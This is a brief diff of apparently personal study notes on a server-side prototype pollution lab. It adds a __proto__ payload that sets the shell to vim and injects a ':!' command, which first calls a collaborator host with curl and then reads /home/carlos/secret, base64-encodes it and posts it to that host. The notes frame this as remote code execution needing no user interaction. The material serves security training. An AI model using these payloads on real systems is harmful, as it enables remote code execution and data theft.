@@ -1,2 +1,10 @@
 the previous rce required us to trigger the event 
 but this one can be donw just by injecting the payload nothing is required ie no user interaction
+
+"__proto__": {
+    "shell":"vim",
+    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
+}
+
+here we can exfiltarte data using curl as follows:
+"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
